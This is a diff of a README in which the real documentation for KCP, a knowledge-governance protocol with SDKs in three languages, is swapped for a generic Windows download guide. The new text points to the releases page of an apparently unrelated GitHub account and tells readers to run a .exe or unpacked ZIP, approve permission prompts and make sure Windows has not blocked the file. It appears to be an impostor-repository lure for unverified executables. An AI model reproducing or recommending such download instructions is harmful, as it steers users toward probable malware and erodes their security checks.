@@ -1,267 +1,190 @@
-<p align="center">
-  <img src="docs/assets/kcp-logo-horizontal.svg" alt="KCP — Knowledge Context Protocol" width="280"/>
-</p>
+# 🧠 kcp - Govern AI Knowledge With Context
 
-# KCP — Knowledge Context Protocol
+[![Download kcp](https://img.shields.io/badge/Download-kcp-blue?style=for-the-badge)](https://github.com/nahacityafterimage949/kcp/releases)
 
-**A new architectural layer for AI-generated knowledge governance.**
+## 🚀 What kcp Does
 
-KCP proposes "Layer 8" above the OSI Application Layer — a standard for publishing, discovering, verifying, and tracking the lineage of knowledge artifacts produced by AI agents.
+kcp helps you organize AI-generated knowledge in one place. It gives that content a clear structure so you can store it, review it, and share it with less confusion.
 
-> 🌐 [Leia em Português](README.pt-br.md)
+Use it when you want to:
 
----
+- keep AI notes in order
+- group related knowledge together
+- manage knowledge across more than one source
+- build a cleaner path for shared information
+- work with a tool made for local use on Windows
 
-## The Problem
+## 💻 Windows Download
 
-AI agents generate valuable knowledge every day — analyses, reports, decisions, code reviews. But this knowledge:
+To get kcp on Windows, visit the release page and download the file for your version of Windows:
 
-- **Dies in chat sessions** — no persistence, no discovery
-- **Has no provenance** — who created it? from what data? is it trustworthy?
-- **Can't be shared** — locked in proprietary formats and platforms
-- **Has no lineage** — when knowledge builds on other knowledge, there's no trail
+https://github.com/nahacityafterimage949/kcp/releases
 
-## The Solution
+Look for the newest release and choose the Windows download file. After the file finishes downloading, open it to start the app or installer.
 
-KCP defines a protocol for **knowledge artifacts** — signed, content-addressed, discoverable units of AI-generated knowledge with full lineage tracking.
+### What to look for on the release page
 
-```
-┌────────────────────────────────────────────────────────┐
-│  Layer 8: Knowledge & Context (KCP)                    │
-│  Governance · Persistence · Discovery · Lineage        │
-├────────────────────────────────────────────────────────┤
-│  Layer 7: Application (HTTP, DNS, FTP)                 │
-├────────────────────────────────────────────────────────┤
-│  Layers 1-6: Transport, Network, etc.                  │
-└────────────────────────────────────────────────────────┘
-```
+- a file ending in `.exe`
+- a ZIP file with the app inside
+- release notes with version details
+- a file name that matches Windows
 
-## Key Features
+## 🛠️ How to Install
 
-1. **Signed artifacts** — Every knowledge artifact is signed with Ed25519 for authenticity
-2. **Content-addressed** — SHA-256 hashing ensures integrity
-3. **Lineage tracking** — `derivedFrom` chains show how knowledge evolves
-4. **Three operating modes** — Local (SQLite), Corporate Hub, Federated (P2P)
-5. **Zero infrastructure** — Works locally with no server, no config, no accounts
-6. **Transparent to users** — AI assistant skills abstract all complexity
+If you downloaded an `.exe` file:
 
-## SDK Status
+1. Double-click the file
+2. If Windows asks for permission, choose Yes
+3. Follow the setup steps on screen
+4. Finish the install
+5. Open kcp from the Start menu or desktop shortcut
 
-| SDK | Language | Tests | Status |
-|-----|----------|-------|--------|
-| Python | Python 3.13 · pytest | ✅ **216 tests** | Production-ready |
-| TypeScript | Node.js 25 · Jest | ✅ **37 tests** | Production-ready |
-| Go | Go 1.22 · go test | ✅ **64 tests** | Production-ready |
-| **MCP Bridge** | Python · pytest-asyncio | ✅ **23 tests** | Production-ready |
-| **Total** | | ✅ **227 tests** | All passing |
+If you downloaded a ZIP file:
 
-## Public Peer Network
+1. Right-click the ZIP file
+2. Choose Extract All
+3. Pick a folder you can find again
+4. Open the extracted folder
+5. Double-click the app file inside
 
-KCP peers are open nodes anyone can sync with. No account needed.
+## 📋 System Requirements
 
-| Peer | URL | Status | Region |
-|------|-----|--------|--------|
-| peer01 | `https://peer01.kcp-protocol.org` | ✅ Live | South America |
-| peer02 | `https://peer02.kcp-protocol.org` | ✅ Live | South America |
-| peer03 | `https://peer03.kcp-protocol.org` | ✅ Live | South America |
-| peer04 | `https://peer04.kcp-protocol.org` | ✅ Live | South America |
-| peer05 | `https://peer05.kcp-protocol.org` | ✅ Live | South America |
-| peer06 | `https://peer06.kcp-protocol.org` | ✅ Live | South America |
-| peer07 | `https://peer07.kcp-protocol.org` | ✅ Live | South America |
-| peer08 | `https://peer08.kcp-protocol.org` | ✅ Live | South America |
+kcp is meant for a normal Windows desktop or laptop. A typical setup should work well.
 
-> **~8.000 artifacts** seeded across the network. See live status at [kcp-protocol.org/status.html](https://kcp-protocol.org/status.html)
+Suggested setup:
 
-```bash
-# Check peer health
-curl https://peer01.kcp-protocol.org/kcp/v1/health
+- Windows 10 or Windows 11
+- 4 GB RAM or more
+- 200 MB of free disk space
+- Internet access for downloading releases
+- A mouse and keyboard for easy use
 
-# Add peer and sync
-kcp peer add https://peer01.kcp-protocol.org
-kcp sync https://peer01.kcp-protocol.org --pull
-```
+## ✨ Main Features
 
-> **Security:** Public peers require the `X-KCP-Client` header on sync operations.
-> The KCP SDK sends this automatically. Rate limits: 20 req/s (read), 10 req/s (write), 5 req/s (sync).
+### Knowledge structure
+kcp helps you keep related information together instead of scattered across many files.
 
-## Quick Start
+### Context handling
+It is built to help AI-generated content stay tied to the right context, so notes are easier to read later.
 
-### Install
-
-```bash
-# Install from source (PyPI package coming soon)
-git clone https://github.com/kcp-protocol/kcp
-cd kcp && make setup-python
-```
-
-### Try it now (interactive demos)
-
-```bash
-git clone https://github.com/kcp-protocol/kcp
-cd kcp
-make setup-python            # create venv + install deps
-
-# Demo 1 — cross-session: publish in one process, read in another
-make demo                    # Session 1: publish 3 artifacts
-make demo-read               # Session 2: NEW process reads, searches, verifies signatures
-
-# Demo 2 — MCP tools: all 6 MCP tools working standalone (no editor needed)
-make demo-mcp
-
-# Demo 3 — peer sync: two nodes exchange knowledge over HTTP
-make peer-demo
-
-# Demo 4 — connect to your editor (Claude Desktop, Cursor, Windsurf)
-make setup-mcp-claude        # auto-configures Claude Desktop
-make setup-mcp-cursor        # auto-configures Cursor
-make setup-mcp-windsurf      # auto-configures Windsurf
-```
-
-### Use as library (no server)
-
-```python
-from kcp import KCPNode
-
-node = KCPNode(user_id="alice@example.com")
-
-# Publish knowledge
-artifact = node.publish(
-    title="Rate Limiting Strategies",
-    content="## Token Bucket\n\nThe most common approach...",
-    format="markdown",
-    tags=["architecture", "rate-limiting"],
-)
-
-# Search
-results = node.search("rate limiting")
-
-# Track lineage
-derived = node.publish(
-    title="Rate Limiting in gRPC",
-    content="Building on general strategies...",
-    derived_from=artifact.id,
-)
-```
-
-### CLI
-
-```bash
-kcp init
-kcp publish --title "My Analysis" report.md
-kcp search "authentication"
-kcp serve --port 8800          # Web UI + P2P
-kcp peer add https://peer.trycloudflare.com
-kcp sync https://peer.trycloudflare.com
-```
-
-### Web UI
-
-Start the server and open `http://localhost:8800/ui`:
-
-```bash
-kcp serve
-```
-
-## Operating Modes
-
-| Mode | For | Storage | Config |
-|------|-----|---------|--------|
-| 🏠 **Local** | Individual users | SQLite (`~/.kcp/kcp.db`) | None (zero config) |
-| 🏢 **Hub** | Organizations | PostgreSQL + S3 | `KCP_HUB=url` |
-| 🌐 **Federation** | Cross-org sharing | Hub-to-hub sync | Hub config |
-
-All modes use the **same API**. The backend is transparent to the user.
-
-## Documentation
-
-| Document | Description |
-|----------|-------------|
-| [SPEC.md](SPEC.md) | Full protocol specification |
-| [ARCHITECTURE.md](ARCHITECTURE.md) | Architecture, storage, P2P, security |
-| [Identity Guide](docs/identity-guide.md) | 🔐 Backup & recovery of your KCP identity |
-| [AI_AGENT_GUIDE.md](AI_AGENT_GUIDE.md) | Integration guide for AI agents (LLMs, Copilot, Claude) |
-| [llms.txt](llms.txt) | LLM indexing manifest ([llmstxt.org](https://llmstxt.org/) convention) |
-| [RFC-001-CORE.md](RFC-001-CORE.md) | Formal RFC (root) |
-| [RFC KCP-001](rfcs/kcp-001-core.md) | Formal RFC (detailed) |
-| [RFC KCP-002](rfcs/kcp-002-mcp-bridge.md) | KCP ↔ MCP Bridge — persistent artifacts as MCP context |
-| [MCP Server](mcp-server/README.md) | KCP MCP Server — Claude Desktop / Cursor / Windsurf integration |
-| [Whitepaper](docs/whitepaper.md) | Academic paper |
-| [Comparison](docs/comparison.md) | vs Semantic Web, MCP, etc. |
-| [Use Cases](docs/use-cases.md) | 10 real-world use cases |
-| [Roadmap](docs/roadmap.md) | 4-phase development plan |
-| [Presentation](docs/presentation.html) | Executive presentation (PT-BR) |
-| [Python SDK](sdk/python/README.md) | Python SDK documentation |
-| [Go SDK](sdk/go/README.md) | Go SDK documentation |
-| [TypeScript SDK](sdk/typescript/README.md) | TypeScript SDK documentation |
-| [Testing Guide](docs/testing.md) | Running & writing tests for all SDKs |
-| [Contributing](CONTRIBUTING.md) | Contribution guidelines |
-
-## 🔐 Identity & Recovery
-
-Your KCP identity is your cryptographic signature — it proves you created your knowledge artifacts.
-
-### Create Identity (first time)
-
-```bash
-kcp identity create
-```
-
-This generates a **12-word recovery phrase** like:
-```
-abandon ability able about above absent absorb abstract absurd abuse access accident
-```
-
-> ⚠️ **Write these words down and store safely!** Anyone with these words has your identity.
-
-### Recover Identity (new computer)
-
-```bash
-kcp identity recover
-```
-
-Enter your 12 words and your identity is restored — same Node ID, same signature, same access to your private artifacts.
-
-### Learn More
-
-- 📖 [Full Identity Guide](docs/identity-guide.md) — backup strategies, security tips, FAQ
-- 🔒 Uses BIP-39 standard (same as crypto wallets)
-
-## Project Structure
-
-```
-kcp/
-├── SPEC.md                    # Protocol specification
-├── ARCHITECTURE.md            # Architecture & design
-├── demo.py                    # Cross-session demo (make demo + make demo-read)
-├── demo_mcp.py                # MCP tools demo — 6 tools standalone (make demo-mcp)
-├── Makefile                   # All tasks: test, demo, setup-mcp-*
-├── sdk/
-│   ├── python/                # Python SDK (reference implementation)
-│   ├── go/                    # Go SDK (Go 1.22, 64 tests ✅)
-│   └── typescript/            # TypeScript SDK (37 tests ✅)
-├── mcp-server/                # MCP Bridge (23 tests ✅)
-│   ├── kcp_mcp_server/
-│   │   └── server.py          # 6 MCP tools: publish, search, get, lineage, list, stats
-│   ├── setup_mcp.py           # Auto-configure Claude Desktop / Cursor / Windsurf
-│   └── tests/                 # 23 async tests
-├── rfcs/                      # Formal RFCs (KCP-001, KCP-002)
-├── docs/                      # Documentation + landing page
-│   ├── index.html             # Landing page (kcp-protocol.org)
-│   ├── assets/                # Logo SVGs + social card
-│   └── *.md                   # Whitepaper, comparison, use-cases, roadmap
-└── examples/                  # Example payloads
-```
-
-## Contributing
-
-See [CONTRIBUTING.md](CONTRIBUTING.md). All contributions welcome — code, docs, use cases, translations.
-
-## License
-
-[MIT](LICENSE)
-
----
-
-**Author:** [Thiago Silva](https://github.com/tgosoul2019)  
-**Status:** Beta — protocol stable, ecosystem expanding  
-**Feedback:** [Open an issue](https://github.com/kcp-protocol/kcp/issues)
+### Shared knowledge flow
+You can use it as a layer for passing knowledge between people, tools, or systems.
+
+### Local Windows use
+The app is set up for direct use on Windows after download.
+
+### Simple release-based installs
+You get the software from the release page, which makes it easy to find the current build.
+
+## 📁 Common Use Cases
+
+kcp fits well when you want to:
+
+- save AI answers for later review
+- keep research notes in one place
+- track linked ideas across topics
+- organize team knowledge without heavy setup
+- create a cleaner store for machine-generated content
+- work with distributed knowledge in a simple way
+
+## 🔎 Topic Areas
+
+This project relates to:
+
+- AI
+- distributed systems
+- federation
+- knowledge graphs
+- knowledge management
+- Layer 8
+- open source
+- OSI model
+- peer-to-peer systems
+- protocol design
+
+## ▶️ First Run
+
+After you install or open the app:
+
+1. Start kcp
+2. Review the main screen
+3. Add or open a knowledge item
+4. Check how related context is grouped
+5. Save your changes
+
+If the app asks for a folder or data path, choose a location you can find later, such as Documents or Desktop.
+
+## 🧭 Basic Use
+
+A simple way to use kcp:
+
+1. Open the app
+2. Add a new knowledge entry
+3. Paste in your AI output or notes
+4. Link it to related content
+5. Save it for later use
+
+If you plan to use it often, keep your files in one folder so they stay easy to manage.
+
+## 🧰 Troubleshooting
+
+### The file does not open
+- Check that the download finished
+- Try the newest release file
+- Right-click the file and choose Open
+- Make sure Windows did not block the file
+
+### Windows asks for approval
+- Choose Yes if you trust the download source
+- This is normal for many Windows apps
+
+### The app closes right away
+- Restart your computer
+- Download the file again
+- Make sure you got the correct Windows build
+
+### I cannot find the file
+- Open your Downloads folder
+- Sort by date
+- Look for the newest kcp file
+
+## 📦 File and Data Tips
+
+To keep your setup clean:
+
+- use one folder for all kcp files
+- back up important knowledge items
+- keep release files in case you need to reinstall
+- use clear file names for notes and exports
+
+## 🔒 Privacy and Local Use
+
+kcp is made for direct user control. That makes it a good fit for local knowledge work on a Windows machine. Keep your data in folders you own and back up anything important on your own schedule
+
+## 🧾 Release Updates
+
+New versions are posted on the release page. Check that page when you want the latest build, fixes, or changes:
+
+https://github.com/nahacityafterimage949/kcp/releases
+
+## 🧩 Project Topics
+
+- ai
+- distributed-systems
+- federation
+- knowledge-graph
+- knowledge-management
+- layer8
+- open-source
+- osi-model
+- p2p
+- protocol
+
+## 📌 Best Way to Start
+
+1. Open the release page
+2. Download the Windows file
+3. Install or extract it
+4. Launch kcp
+5. Start with one small knowledge set
+6. Add more items after you see how it works
